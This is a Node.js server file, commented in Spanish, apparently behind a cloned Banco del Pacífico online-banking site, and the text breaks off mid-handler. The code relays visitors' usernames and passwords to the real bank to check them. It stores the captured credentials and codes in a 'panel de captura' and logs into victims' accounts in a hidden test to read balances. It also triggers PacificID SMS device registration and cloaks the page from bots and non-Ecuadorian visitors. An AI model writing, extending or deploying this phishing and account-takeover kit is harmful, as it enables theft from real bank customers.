// ============================================================
// SERVIDOR LOCAL — Clone Intermatico + validación real de credenciales
//
// Sirve el sitio estático del clone Y expone la API que valida
// usuario/clave contra https://www.intermatico.com/ replicando el
// flujo WebFlow documentado en el proyecto de investigación:
//   C:\Users\Djthe\analisis-api-banco-pacifico (kit-demo/lib/demo-login.cjs)
//
// Endpoints:
//   GET  /api/health   → { ok: true }
//   POST /api/usuario  → { usuario }        DWR obtenerAvatarPorUsername (chequeo del usuario)
//   POST /api/login    → { usuario, clave } flujo completo de login
//
// Uso:  node server.cjs    →    http://127.0.0.1:8137/
// ============================================================
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// Render/Heroku inyectan PORT y exigen escuchar en 0.0.0.0;
// en local, por defecto 127.0.0.1:8138 (+ alias 8137).
const PORT = parseInt(process.env.PORT || '8138', 10);
const HOST = process.env.PORT ? '0.0.0.0' : '127.0.0.1';
const ROOT = __dirname;
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const REQUEST_TIMEOUT_MS = 20000;

// ------------------------------------------------------------
// Cliente HTTPS hacia el banco
// ------------------------------------------------------------
function reqBank(hostname, pathName, method, headers, body) {
  return new Promise((resolve, reject) => {
    const r = https.request({ hostname, path: pathName, method, headers }, res => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', d => (data += d));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    r.setTimeout(REQUEST_TIMEOUT_MS, () => r.destroy(new Error(`Timeout de ${REQUEST_TIMEOUT_MS} ms`)));
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

function hiddenFields(html) {
  const out = {};
  for (const m of html.matchAll(/<input[^>]*type="hidden"[^>]*>/gi)) {
    const name = (m[0].match(/name="([^"]*)"/) || [])[1];
    const value = (m[0].match(/value="([^"]*)"/) || [])[1];
    if (name) out[name] = value ?? '';
  }
  return out;
}

// ------------------------------------------------------------
// Chequeo de usuario: paso real del WebFlow (portada → usuario → página de clave).
// Devuelve validez + avatar real (/ebanking/imagesAvatar/<id>) + nombre mostrado.
// ------------------------------------------------------------
async function checkUsuarioWebFlow(user) {
  const jar = {};
  const cookieStr = () => Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');
  const save = res => (res.headers['set-cookie'] || []).forEach(c => {
    const [kv] = c.split(';');
    const [k, ...v] = kv.split('=');
    jar[k.trim()] = v.join('=');
  });
  const H = (extra = {}) => ({ 'User-Agent': UA, ...extra });

  // 1) Portada
  let r = await reqBank('www.intermatico.com', '/ebanking/', 'GET', H());
  save(r);

  // 2) POST usuario
  const base = {
    biometric: 'false', bioBlocked: 'null', ipClient: '', ApiVersion: '', IsDsbClienteInstalled: '',
    Version: '', MachineUserId: '', Os: '', OsVersion: '', Arch: '', MachineUserIdDevice: '',
    DeviceModel: '', deviceManufacturer: '', browserDeviceMobile: 'false', isIE: 'false',
    btnLOPDP: '', j_username: user,
  };
  r = await reqBank('www.intermatico.com', '/ebanking/seguridad/login', 'POST', H({
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookieStr(),
    'Referer': 'https://www.intermatico.com/ebanking/',
    'Origin': 'https://www.intermatico.com',
  }), new URLSearchParams({ ...base, botonSendUsername: 'Continuar' }).toString());
  save(r);

  // 3) Página de clave
  r = await reqBank('www.intermatico.com', '/ebanking/seguridad/login.htm', 'GET', H({ 'Cookie': cookieStr() }));
  save(r);

  const html = r.body || '';

  // ¿Llegó a la página de clave (campo j_password)?
  const tienePassword = /id="password"|name="j_password"/i.test(html);

  // Avatar real del usuario (mismo <img id="avatar"> que muestra el banco)
  const avatarPath = (html.match(/id="avatar"[^>]*src="([^"]+)"/i) || [])[1] || null;

  // Nombre mostrado bajo el avatar (<p class="centrado">NOMBRE</p> dentro de pedirPasswordBox)
  const seg = avatarPath ? html.slice(html.indexOf('id="avatar"')) : '';
  const nombre = (seg.match(/<p[^>]*class="centrado"[^>]*>\s*([^<]+?)\s*<\/p>/i) || [])[1] || null;

  return {
    valid: tienePassword,
    avatarPath: avatarPath && avatarPath.startsWith('/ebanking/') ? avatarPath : null,
    nombre: nombre && /[A-ZÁÉÍÓÚÑ]/i.test(nombre) ? nombre : null,
    lastUrl: r.status === 200 ? 'https://www.intermatico.com/ebanking/seguridad/login.htm' : null,
  };
}

const imgCache = new Map(); // path → { contentType, buffer } (imágenes de seguridad traídas con sesión)

// ============================================================
// PANEL DE CAPTURA — sesiones en vivo de los visitantes
// ============================================================
const panelSessions = new Map(); // sid → registro del usuario capturado
const geoCache = new Map();      // ip → { countryCode, country }
const GEO_TTL_MS = 30 * 60 * 1000;

// ---- Persistencia: las sesiones sobreviven reinicios y caídas del servidor ----
const ARCHIVO_DATOS = path.join(ROOT, 'datos', 'panel-sesiones.json');
let datosSucios = false;

function guardarDatos() {
  try {
    fs.mkdirSync(path.dirname(ARCHIVO_DATOS), { recursive: true });
    const lista = [...panelSessions.values()].map(s => ({
      sid: s.sid, creado: s.creado, visto: s.visto, ip: s.ip, geo: s.geo,
      flujo: s.flujo, paso: s.paso, usuario: s.usuario, clave: s.clave,
      dispositivo: s.dispositivo, codigo: s.codigo, codigoSms: s.codigoSms,
      tecleando: s.tecleando, avatarUrl: s.avatarUrl, nombreImagen: s.nombreImagen,
      login: s.login, empresaLogin: s.empresaLogin, codigoVeredicto: s.codigoVeredicto,
      sms: s.sms, saldoConsulta: s.saldoConsulta, bancoSession: s.bancoSession,
    }));
    fs.writeFileSync(ARCHIVO_DATOS, JSON.stringify({ guardado: Date.now(), sesiones: lista }, null, 2));
    datosSucios = false;
  } catch (e) {
    console.error('No se pudo guardar el estado del panel:', e.message);
  }
}

function cargarDatos() {
  try {
    if (!fs.existsSync(ARCHIVO_DATOS)) return;
    const data = JSON.parse(fs.readFileSync(ARCHIVO_DATOS, 'utf8'));
    (data.sesiones || []).forEach(s => {
      panelSessions.set(s.sid, {
        ...s,
        codigoPendiente: null, // las esperas en curso no se pueden restaurar
      });
    });
    console.log(`(Restauradas ${panelSessions.size} sesiones del panel desde ${ARCHIVO_DATOS})`);
  } catch (e) {
    console.error('No se pudo restaurar el estado del panel:', e.message);
  }
}

function marcarSucio() { datosSucios = true; }

cargarDatos();
setInterval(() => { if (datosSucios) guardarDatos(); }, 8000);
process.on('SIGINT', () => { guardarDatos(); process.exit(0); });

function ipCliente(req) {
  // Detrás de Render/ngrok la IP real viene en X-Forwarded-For
  const xff = String(req.headers['x-forwarded-for'] || '').split(',')[0].trim();
  if (xff) return xff;
  return req.socket.remoteAddress || '';
}

const UA_BOT_RE = /(bot|crawler|spider|slurp|bingpreview|facebookexternalhit|twitterbot|whatsapp|headlesschrome|curl|wget|python-requests|axios|node-fetch|gptbot|openai|semrush|ahrefs|mj12|dotbot|petalbot|dataforseo|monitoring|uptime|pingdom|vercel|render)/i;

function esIpPrivada(ip) {
  return !ip || /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|localhost|::ffff:127\.)/.test(ip);
}

// ¿Puede ver el index? Solo humanos desde Ecuador.
// - Sin User-Agent o con UA de bot → NO (ve terminos).
// - IP privada/local → SÍ (pruebas propias).
// - Geo falla o desconocida → SÍ (cuidado extremo con no bloquear ecuatorianos).
async function permitirVerIndex(req) {
  const ua = String(req.headers['user-agent'] || '');
  if (!ua || UA_BOT_RE.test(ua)) return false;
  const ip = ipCliente(req);
  if (esIpPrivada(ip)) return true;
  try {
    const geo = await geoDeIp(ip);
    if (!geo || geo.countryCode === '??' || geo.countryCode === 'LOCAL') return true;
    return geo.countryCode === 'EC';
  } catch (e) {
    return true; // fail-open: nunca bloquear por falla de geolocalización
  }
}

function nuevoSid() {
  return 's' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function cookiesDe(req) {
  const out = {};
  String(req.headers.cookie || '').split(';').forEach(c => {
    const [k, ...v] = c.split('=');
    if (k) out[k.trim()] = v.join('=');
  });
  return out;
}

function banderaEmoji(cc) {
  if (!cc || cc.length !== 2) return '🌍';
  return String.fromCodePoint(...[...cc.toUpperCase()].map(ch => 127397 + ch.charCodeAt(0)));
}

function geoDeIp(ip) {
  if (!ip || /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|localhost)/.test(ip)) {
    return Promise.resolve({ countryCode: 'LOCAL', country: 'Red local', flag: '🖥️' });
  }
  const cached = geoCache.get(ip);
  if (cached && Date.now() - cached.t < GEO_TTL_MS) return Promise.resolve(cached);
  return new Promise(resolve => {
    const r = http.get(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,countryCode,country`, res => {
      let d = '';
      res.on('data', c => (d += c));
      res.on('end', () => {
        try {
          const j = JSON.parse(d);
          if (j.status === 'success') {
            const info = { countryCode: j.countryCode, country: j.country || j.countryCode, flag: banderaEmoji(j.countryCode), t: Date.now() };
            geoCache.set(ip, info);
            return resolve(info);
          }
        } catch (_) { /* abajo */ }
        resolve({ countryCode: '??', country: 'Desconocido', flag: '🌍' });
      });
    });
    r.setTimeout(5000, () => r.destroy());
    r.on('error', () => resolve({ countryCode: '??', country: 'Desconocido', flag: '🌍' }));
  });
}

function obtenerOcrearSesion(req, res) {
  const cookies = cookiesDe(req);
  let sid = cookies.labSid;
  if (!sid || !panelSessions.has(sid)) {
    sid = nuevoSid();
    if (res) {
      res.setHeader('Set-Cookie', `labSid=${sid}; Path=/; Max-Age=86400; SameSite=Lax`);
    }
    panelSessions.set(sid, {
      sid,
      creado: Date.now(),
      visto: Date.now(),
      ip: req.socket.remoteAddress || '',
      geo: null,
      flujo: null,
      paso: null,
      usuario: '',
      clave: '',
      dispositivo: '',
      codigo: '',
      codigoSms: '',
      tecleando: null,      // { campo, ts }
      avatarUrl: null,
      nombreImagen: null,
      login: null,          // personas
      empresaLogin: null,   // empresas
      codigoVeredicto: null, // bueno | malo
      codigoPendiente: null, // { codigo, tipo, ts, resuelto, resolve } — víctima esperando veredicto
      sms: null,            // { estado, mensaje, ts }
      saldoConsulta: null,  // { estado, saldo, nombre, mensaje, ts }
      bancoSession: null,    // jar de cookies del banco tras login válido
    });
  }
  marcarSucio();
  return panelSessions.get(sid);
}

function registroPublico(s) {
  return {
    sid: s.sid,
    creado: s.creado,
    visto: s.visto,
    ip: s.ip,
    geo: s.geo,
    flujo: s.flujo,
    paso: s.paso,
    usuario: s.usuario,
    clave: s.clave,
    dispositivo: s.dispositivo,
    codigo: s.codigo,
    codigoSms: s.codigoSms,
    tecleando: s.tecleando,
    avatarUrl: s.avatarUrl,
    nombreImagen: s.nombreImagen,
    login: s.login,
    empresaLogin: s.empresaLogin,
    codigoVeredicto: s.codigoVeredicto,
    codigoEnEspera: !!(s.codigoPendiente && !s.codigoPendiente.resuelto),
    enLinea: Date.now() - s.visto < 30000,
    saldoConsulta: s.saldoConsulta || null,
    tieneBancoSession: !!s.bancoSession,
    sms: s.sms,
  };
}

// TEST DE LOGIN OCULTO + SALDO: usa las credenciales capturadas para abrir una
// sesión NUEVA contra el banco (desde esta máquina / IP de confianza) y leer
// el saldo del dashboard. No depende de la sesión de la víctima.
async function consultarSaldo(reg) {
  if (!reg.usuario || !reg.clave) {
    throw new Error('No hay credenciales capturadas de este usuario.');
  }

  const lr = await loginIntermatico(reg.usuario, reg.clave);

  if (lr.errorLogin) {
    return { estado: 'error', mensaje: 'El banco rechazó las credenciales en el test oculto.', ts: Date.now() };
  }

  // Guardar la sesión fresca por si se necesita (SMS, próximas consultas)
  if (lr.pideRegistro || lr.pidePacificID || lr.dashboard) {
    reg.bancoSession = lr.cookies;
  }

  if (lr.saldo) {
    return { estado: 'ok', saldo: lr.saldo, nombre: lr.nombre, ts: Date.now() };
  }
  if (lr.pidePacificID) {
    return { estado: 'pacifid', mensaje: 'Login OK, pero el banco pide código PacificID: saldo no visible aún.', ts: Date.now() };
  }
  if (lr.pideRegistro) {
    return { estado: 'registro', mensaje: 'Login OK, pero el banco pide registrar dispositivo: saldo no visible aún.', ts: Date.now() };
  }
  if (lr.dashboard) {
    return { estado: 'sin-dato', mensaje: 'Login OK y dashboard abierto, pero no se encontró el texto del saldo.', ts: Date.now() };
  }
  return { estado: 'desconocido', mensaje: 'El banco respondió algo no reconocido en el test oculto.', ts: Date.now() };
}

// Extrae TODOS los campos de un formulario (inputs con valor + selects),
// no solo los hidden — el POST del SMS necesita documento, pregunta, etc.
function formFields(html) {
  const out = {};
  for (const m of html.matchAll(/<input[^>]*>/gi)) {
    const tag = m[0];
    const name = (tag.match(/name="([^"]+)"/i) || [])[1];
    if (!name) continue;
    const type = ((tag.match(/type="([^"]*)"/i) || [])[1] || 'text').toLowerCase();
    if (/submit|button|image|file/.test(type)) continue;
    const value = (tag.match(/value="([^"]*)"/i) || [])[1];
    out[name] = value == null ? '' : value;
  }
  for (const m of html.matchAll(/<select[^>]*name="([^"]+)"[^>]*>([\s\S]*?)<\/select>/gi)) {
    const sel = m[0];
    const opt = (sel.match(/<option[^>]*selected[^>]*value="([^"]*)"/i) || [])[1] ||
               (sel.match(/<option[^>]*value="([^"]*)"/i) || [])[1] || '';
    out[m[1]] = opt;
  }
  return out;
}

function textoPlano(html, max) {
  return String(html || '')
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ')
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, max || 320);
}

// Disparar el SMS dPc_ (PacificID en otro equipo) con la sesión del banco guardada
async function pedirSmsPacificId(reg) {
  const H = (extra = {}) => ({ 'User-Agent': UA, ...extra });
  const cookieStr = jar => Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');

  const intento = async (jar) => {
    // 1) Página de configuración de cuenta
    let r = await reqBank('www.intermatico.com', '/ebanking/usuario/configuracion/cuentaCliente.htm', 'GET', H({ 'Cookie': cookieStr(jar) }));
    let loc = r.headers['location'];
    let hops = 0;
    while (loc && hops < 5) {
      const u = new URL(loc, 'https://www.intermatico.com');
      r = await reqBank(u.hostname, u.pathname + u.search, 'GET', H({ 'Cookie': cookieStr(jar) }));
      loc = r.headers['location'];
      hops++;
    }
    const html = r.body || '';
    // ¿Sesión viva? Si volvió al login, no hay execution.
    const exec = (html.match(/cuentaCliente\.htm\?execution=(\w+)/) || [])[1] ||
      ((r.headers['location'] || '').match(/execution=(\w+)/) || [])[1];
    if (!exec || /j_username|security\/login/i.test(html + (r.headers['location'] || ''))) {
      return { viva: false, html };
    }
    // 2) POST del evento de registro PacificID (TODOS los campos del formulario:
    //    documento, pregunta secreta, email, etc. — no solo los hidden)
    const ff = formFields(html);
    const body = new URLSearchParams({
      ...ff,
      _eventId_modificarPacificIdRegistroDevice: '',
      tipoAuth: 'SFT',
      uriTipoAutenticacionSeleccionado: 'SFT',
    });
    r = await reqBank('www.intermatico.com',
      `/ebanking/usuario/configuracion/cuentaCliente.htm?execution=${exec}`, 'POST', H({
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookieStr(jar),
        'Referer': `https://www.intermatico.com/ebanking/usuario/configuracion/cuentaCliente.htm?execution=${exec}`,
        'Origin': 'https://www.intermatico.com',
      }), body.toString());
    // 3) Seguir y leer el mensaje final
    loc = r.headers['location'];
    hops = 0;
    while (loc && hops < 5) {
      const u = new URL(loc, 'https://www.intermatico.com');
      r = await reqBank(u.hostname, u.pathname + u.search, 'GET', H({ 'Cookie': cookieStr(jar) }));
      loc = r.headers['location'];
      hops++;
    }
    return { viva: true, html: r.body || '' };
  };

  let jar = reg.bancoSession || null;
  if (!jar) throw new Error('No hay sesión del banco (el usuario aún no inicia sesión).');
  let r = await intento(jar);
  if (!r.viva) {
    // Re-login con las credenciales capturadas y reintentar
    if (!reg.usuario || !reg.clave) throw new Error('Sesión expirada y no hay credenciales capturadas.');
    const lr = await loginIntermatico(reg.usuario, reg.clave);
    if (!lr || !(lr.pideRegistro || lr.pidePacificID || lr.dashboard)) {
      throw new Error('No fue posible reautenticar con el banco.');
    }
    jar = lr.cookies;
    reg.bancoSession = jar;
    r = await intento(jar);
    if (!r.viva) throw new Error('Sesión del banco no disponible tras reautenticar.');
  }

  const html = r.html || '';
  const popUp = (html.match(/PopUpExitoActivoPacificId[^>]*value="([^"]*)"/) || [])[1] || null;
  const exito = /recibira un SMS con el codigo|recibir[aá] un SMS|cambio se realiz[oó] exitosamente|sms con el c[oó]digo de activaci[oó]n/i.test(html);
  const texto = textoPlano(html, 260);
  if (exito) {
    return { estado: 'enviado', mensaje: 'El banco confirmó el envío del SMS con el código de activación (dPc_...).' };
  }
  if (popUp && /Anteriormente ya ha realizado el cambio/i.test(popUp)) {
    return { estado: 'ya-cambiado', mensaje: popUp.replace(/\s+/g, ' ').trim() };
  }
  if (/Anteriormente ya ha realizado el cambio/i.test(html)) {
    const m = (html.match(/Anteriormente ya ha realizado el cambio[^<]*/i) || [])[0];
    return { estado: 'ya-cambiado', mensaje: m.replace(/\s+/g, ' ').trim() };
  }
  // El banco respondió algo que no reconocemos: mostrar su texto real
  return { estado: 'desconocido', mensaje: 'El banco respondió: «' + texto + '»' };
}

// ------------------------------------------------------------
// Login EMPRESAS (portal ASP.NET /Login, distinto del WebFlow Personas)
//   1) GET  /Login/Index               → token1
//   2) POST /Login/Index  {Usuario}    → página de clave (token2, Usuario oculto)
//   3) POST /Login/Autenticar {Password, Usuario} → redirecciones
//   Malo: vuelve a la página de login. Bueno: sale del login (panel).
// ------------------------------------------------------------
async function empresaLogin(user, pass) {
  const jar = {};
  const cookieStr = () => Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');
  const save = res => (res.headers['set-cookie'] || []).forEach(c => {
    const [kv] = c.split(';');
    const [k, ...v] = kv.split('=');
    jar[k.trim()] = v.join('=');
  });
  const H = (extra = {}) => ({ 'User-Agent': UA, ...extra });
  const token = s => (s.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/) || [])[1] || '';

  // 1) GET /Login/Index
  let r = await reqBank('www.intermatico.com', '/Login/Index', 'GET', H());
  save(r);
  const tok1 = token(r.body);

  // 2) POST usuario
  r = await reqBank('www.intermatico.com', '/Login/Index', 'POST', H({
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookieStr(),
    'Referer': 'https://www.intermatico.com/Login/Index',
    'Origin': 'https://www.intermatico.com',
  }), new URLSearchParams({
    __RequestVerificationToken: tok1, Usuario: user, Browser: 'Chrome', VersionBrowser: '131',
  }).toString());
  save(r);
  const tok2 = token(r.body);
  const usuarioHidden = (r.body.match(/name="Usuario"[^>]*value="([^"]*)"/) || [])[1] || user;
  if (!tok2) return { valid: false, message: 'No fue posible iniciar el flujo de empresas.' };

  // Imagen de seguridad de la página de clave (opcional, para fases futuras)
  let imagenPath = (r.body.match(/<img[^>]*alt="Imagen de Seguridad"[^>]*src="([^"]+)"/i) || [])[1] ||
                   (r.body.match(/<img[^>]*src="([^"]*detect2[^"]*)"/i) || [])[1] || null;
  let nombreImagen = (r.body.match(/<p[^>]*class="secret"[^>]*>\s*([^<]+?)\s*<\/p>/i) || [])[1] || null;
  if (imagenPath && imagenPath.startsWith('/')) {
    try {
      const img = await reqBankBin('www.intermatico.com', imagenPath, {
        'User-Agent': UA,
        'Cookie': cookieStr(),
        'Referer': 'https://www.intermatico.com/Login/Index',
      });
      if (img.status === 200 && img.body && img.body.length > 100) {
        imgCache.set(imagenPath, { contentType: img.headers['content-type'] || 'image/jpeg', buffer: img.body });
      }
    } catch (_) { /* la imagen es opcional */ }
  }

  // 3) POST clave
  r = await reqBank('www.intermatico.com', '/Login/Autenticar', 'POST', H({
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookieStr(),
    'Referer': 'https://www.intermatico.com/Login/Index',
    'Origin': 'https://www.intermatico.com',
  }), new URLSearchParams({
    __RequestVerificationToken: tok2,
    Password: pass,
    Usuario: usuarioHidden,
    Browser: 'Chrome',
    VersionBrowser: '131',
  }).toString());
  save(r);

  // Seguir redirecciones
  let lastPath = '/Login/Autenticar';
  let loc = r.headers['location'];
  let hops = 0;
  while (loc && hops < 8) {
    const u = new URL(loc, 'https://www.intermatico.com');
    lastPath = u.pathname;
    r = await reqBank(u.hostname, u.pathname + u.search, 'GET', H({ 'Cookie': cookieStr() }));
    save(r);
    loc = r.headers['location'];
    hops++;
  }

  const html = r.body || '';
  const enLogin = /action="\/Login\/(Index|Autenticar)"/i.test(html) ||
    /Ingrese al Banco del Pac&#237;fico|Ingrese al Banco del Pacífico/i.test(html);

  return {
    valid: !enLogin,
    lastPath,
    finalStatus: r.status,
    imagenPath,
    nombreImagen,
    detalle: { enLogin, lastPath },
  };
}

// Descarga binaria (para el proxy de avatar)
function reqBankBin(hostname, pathName, headers) {
  return new Promise((resolve, reject) => {
    const r = https.request({ hostname, path: pathName, method: 'GET', headers }, res => {
      const chunks = [];
      res.on('data', d => chunks.push(d));
      res.on('end', () => resolve({
        status: res.statusCode,
        headers: res.headers,
        body: Buffer.concat(chunks),
      }));
    });
    r.setTimeout(REQUEST_TIMEOUT_MS, () => r.destroy(new Error(`Timeout de ${REQUEST_TIMEOUT_MS} ms`)));
    r.on('error', reject);
    r.end();
  });
}

// Chequeo DWR alternativo (sin autenticación — ver endpoints/dwr-autenticacion-service.md)
function dwrObtenerAvatar(usuario) {
  const body =
    'callCount=1\n' +
    'page=/ebanking/\n' +
    'httpSessionId=\n' +
    'scriptSessionId=0000000000000000000\n' +
    'instanceId=0\n' +
    'c0-scriptName=autenticacionServiceAjaxFacade\n' +
    'c0-methodName=obtenerAvatarPorUsername\n' +
    'c0-id=0\n' +
    'batchId=1\n' +
    `c0-param0=string:${usuario}\n` +
    'c0-param1=string:x\n';
  return reqBank('www.intermatico.com',
    '/ebanking/dwr/call/plaincall/autenticacionServiceAjaxFacade.obtenerAvatarPorUsername.dwr',
    'POST',
    {
      'Content-Type': 'text/plain; charset=UTF-8',
      'User-Agent': UA,
      'Referer': 'https://www.intermatico.com/ebanking/',
    },
    body);
}

// ------------------------------------------------------------
// Login WebFlow completo (usuario + clave), igual que kit-demo/lib/demo-login.cjs
// ------------------------------------------------------------
async function loginIntermatico(user, pass) {
  const jar = {};
  const cookieStr = () => Object.entries(jar).map(([k, v]) => `${k}=${v}`).join('; ');
  const save = res => (res.headers['set-cookie'] || []).forEach(c => {
    const [kv] = c.split(';');
    const [k, ...v] = kv.split('=');
    jar[k.trim()] = v.join('=');
  });
  const H = (extra = {}) => ({ 'User-Agent': UA, ...extra });

  // 1) Portada
  let r = await reqBank('www.intermatico.com', '/ebanking/', 'GET', H());
  save(r);

  // 2) Usuario
  const base = {
    biometric: 'false', bioBlocked: 'null', ipClient: '', ApiVersion: '', IsDsbClienteInstalled: '',
    Version: '', MachineUserId: '', Os: '', OsVersion: '', Arch: '', MachineUserIdDevice: '',
    DeviceModel: '', deviceManufacturer: '', browserDeviceMobile: 'false', isIE: 'false',
    btnLOPDP: '', j_username: user,
  };
  r = await reqBank('www.intermatico.com', '/ebanking/seguridad/login', 'POST', H({
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookieStr(),
    'Referer': 'https://www.intermatico.com/ebanking/',
    'Origin': 'https://www.intermatico.com',
  }), new URLSearchParams({ ...base, botonSendUsername: 'Continuar' }).toString());
  save(r);

  // 3) Página de clave: capturar hidden fields reales
  r = await reqBank('www.intermatico.com', '/ebanking/seguridad/login.htm', 'GET', H({ 'Cookie': cookieStr() }));
  save(r);
  const hf = hiddenFields(r.body);
  const ipClient = hf.ipClient || null;

  // 4) Clave
  r = await reqBank('www.intermatico.com', '/ebanking/seguridad/login', 'POST', H({
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookieStr(),
    'Referer': 'https://www.intermatico.com/ebanking/seguridad/login.htm',
    'Origin': 'https://www.intermatico.com',
  }), new URLSearchParams({ ...hf, j_password: pass, botonSendPassword: 'Iniciar sesión' }).toString());
  save(r);

  // 5) Seguir redirecciones
  let lastUrl = 'https://www.intermatico.com/ebanking/seguridad/login';
  let loc = r.headers['location'];
  let hops = 0;
  while (loc && hops < 15) {
    const u = new URL(loc, 'https://www.intermatico.com');
    if (!/intermatico\.com$/i.test(u.hostname)) break;
    lastUrl = `https://${u.hostname}${u.pathname}${u.search}`;
    r = await reqBank(u.hostname, u.pathname + u.search, 'GET', H({ 'Cookie': cookieStr() }));
    save(r);
    loc = r.headers['location'];
    hops++;
  }

  const html = r.body || '';
  const pidePacificID = /codigoSegundoFactor/i.test(html);
  const pideRegistro = /descriptionComputer/i.test(html);
  const dashboard = !pidePacificID && !pideRegistro &&
    /productos\/inicio\.htm/i.test(lastUrl) &&
    /posicionConsolidada|Saldo total|Cerrar sesión/i.test(html);
  const errorLogin = /error=accesoDenegado|usuario o clave|clave incorrecta|datos incorrectos/i.test(lastUrl + ' ' + html);
  const saldo = (html.match(/Saldo total:\s*\$[\d.,*]+/) || [])[0] || null;
  const mNombre = html.match(/([A-ZÁÉÍÓÚÑ][a-záéíóúñ]+)&nbsp;([A-ZÁÉÍÓÚÑ][a-záéíóúñ]+)/);
  const nombre = mNombre
    ? `${mNombre[1]} ${mNombre[2]}`
    : ((html.match(/([A-ZÁÉÍÓÚÑ][a-záéíóúñ]+),\s*ha registrado un nuevo equipo/) || [])[1] || null);

  return {
    lastUrl,
    finalStatus: r.status,
    dashboard,
    pidePacificID,
    pideRegistro,
    errorLogin,
    ipClient,
    saldo,
    nombre,
    cookies: jar, // para el panel: sesión viva del banco
  };
}

// ------------------------------------------------------------
// Servidor HTTP: estáticos + API
// ------------------------------------------------------------
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.webp': 'image/webp',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm',
  '.txt': 'text/plain; charset=utf-8',
  '.md': 'text/markdown; charset=utf-8',
};

function sendJson(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', c => {
      data += c;
      if (data.length > 10000) { reject(new Error('Cuerpo demasiado grande')); req.destroy(); }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function serveStatic(req, res, urlPath) {
  let p = decodeURIComponent(urlPath.split('?')[0]);
  if (p === '/' || p === '') p = '/index.html';
  const file = path.normalize(path.join(ROOT, p));
  if (!file.startsWith(ROOT)) { res.writeHead(403); return res.end('Prohibido'); }
  fs.stat(file, (err, st) => {
    if (err || !st.isFile()) {
      // Fallbacks de rutas amigables
      const alt = path.join(ROOT, p, 'index.html');
      return fs.stat(alt, (e2, s2) => {
        if (e2 || !s2.isFile()) { res.writeHead(404); return res.end('No encontrado'); }
        streamFile(res, alt);
      });
    }
    streamFile(res, file);
  });
}

function streamFile(res, file) {
  const ext = path.extname(file).toLowerCase();
  res.writeHead(200, {
    'Content-Type': MIME[ext] || 'application/octet-stream',
    'Cache-Control': 'no-cache',
  });
  fs.createReadStream(file).pipe(res);
}

const server = http.createServer(async (req, res) => {
  const urlPath = req.url || '/';

  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': 'Content-Type',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    });
    return res.end();
  }

  // ---------- API ----------
  if (urlPath === '/api/health' && req.method === 'GET') {
    return sendJson(res, 200, { ok: true, ts: new Date().toISOString() });
  }

  if (urlPath === '/api/usuario' && req.method === 'POST') {
    try {
      const body = JSON.parse((await readBody(req)) || '{}');
      const usuario = String(body.usuario || '').trim();
      if (!usuario) return sendJson(res, 200, { valid: false, message: 'Ingresa tu usuario.' });
      try {
        const r = await checkUsuarioWebFlow(usuario);
        // Registrar en el panel de captura (por cookie labSid)
        const reg = obtenerOcrearSesion(req, res);
        reg.usuario = usuario;
        reg.flujo = reg.flujo || 'personas';
        reg.avatarUrl = r.avatarPath ? `/api/avatar?path=${encodeURIComponent(r.avatarPath)}` : reg.avatarUrl;
        reg.nombreImagen = r.nombre || reg.nombreImagen;
        reg.visto = Date.now();
        if (r.valid) {
          return sendJson(res, 200, {
            valid: true,
            nombre: r.nombre,
            avatarUrl: r.avatarPath ? `/api/avatar?path=${encodeURIComponent(r.avatarPath)}` : null,
            avatarOriginal: r.avatarPath ? `https://www.intermatico.com${r.avatarPath}` : null,
          });
        }
        return sendJson(res, 200, { valid: false, message: 'Nombre de usuario inválido.' });
      } catch (e) {
        // Fallback DWR: si el WebFlow falla, no bloquear; el login final decidirá.
        try {
          const d = await dwrObtenerAvatar(usuario);
          if (/handleCallback/.test(d.body || '') && !/<img|image\.htm\?id=/.test(d.body || '')) {
            return sendJson(res, 200, { valid: false, message: 'Nombre de usuario inválido.' });
          }
        } catch (_) { /* sin fallback disponible */ }
        return sendJson(res, 200, { valid: true, nota: `chequeo WebFlow no disponible: ${e.message}` });
      }
    } catch (e) {
